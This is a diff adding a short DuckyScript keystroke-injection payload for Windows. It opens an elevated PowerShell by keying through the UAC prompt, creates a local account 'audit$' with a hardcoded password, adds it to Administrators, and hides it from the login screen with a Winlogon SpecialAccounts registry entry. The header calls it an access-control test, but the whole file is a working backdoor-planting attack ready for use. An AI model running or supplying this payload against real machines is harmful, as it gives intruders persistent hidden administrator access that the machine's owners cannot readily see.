@@ -1,0 +1,25 @@
+REM ============================================================
+REM  Windows · Create Hidden Admin User
+REM ============================================================
+REM  Opens an elevated prompt and creates a new local admin
+REM  account with a $ suffix (hidden from login screen on
+REM  some Windows editions). Tests access control policies.
+REM
+REM  Requires UAC bypass or user clicking Yes.
+
+DEFAULTDELAY 60
+
+DEFINE UNAME audit$
+DEFINE UPASS Str0ng!Pass2024
+
+GUI r
+DELAY 700
+STRING powershell
+CTRL SHIFT ENTER
+DELAY 2000
+ALT y
+DELAY 1500
+STRINGLN net user UNAME UPASS /add /y
+STRINGLN net localgroup Administrators UNAME /add
+STRINGLN reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v UNAME /t REG_DWORD /d 0 /f
+STRINGLN exit
